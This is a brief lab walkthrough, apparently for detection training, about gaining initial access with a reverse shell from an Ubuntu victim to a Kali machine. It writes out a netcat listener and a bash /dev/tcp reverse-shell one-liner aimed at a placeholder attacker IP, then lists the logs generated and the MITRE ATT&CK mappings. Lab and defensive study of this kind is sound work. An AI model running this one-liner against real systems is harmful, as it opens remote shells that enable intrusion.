🎯 Initial Access – Reverse Shell
📌 Objective
Gain initial access to the victim machine using a reverse shell.

🧠 Why Reverse Shell?
Common attacker technique

Harder to detect than direct connection

Generates network + process logs

⚙️ Step 1: Start Listener (Kali)
nc -lvnp 4444
⚙️ Step 2: Execute Payload (Ubuntu)
bash -i >& /dev/tcp/<kali-ip>/4444 0>&1
👉 Replace <kali-ip>

💥 Result
Kali receives shell

Ubuntu is compromised

🧪 Verification
On Kali:

whoami
📊 Logs Generated
bash execution logs

network connection logs

auditd process logs

🎯 MITRE Mapping
T1059 → Command Execution

T1071 → Application Layer Protocol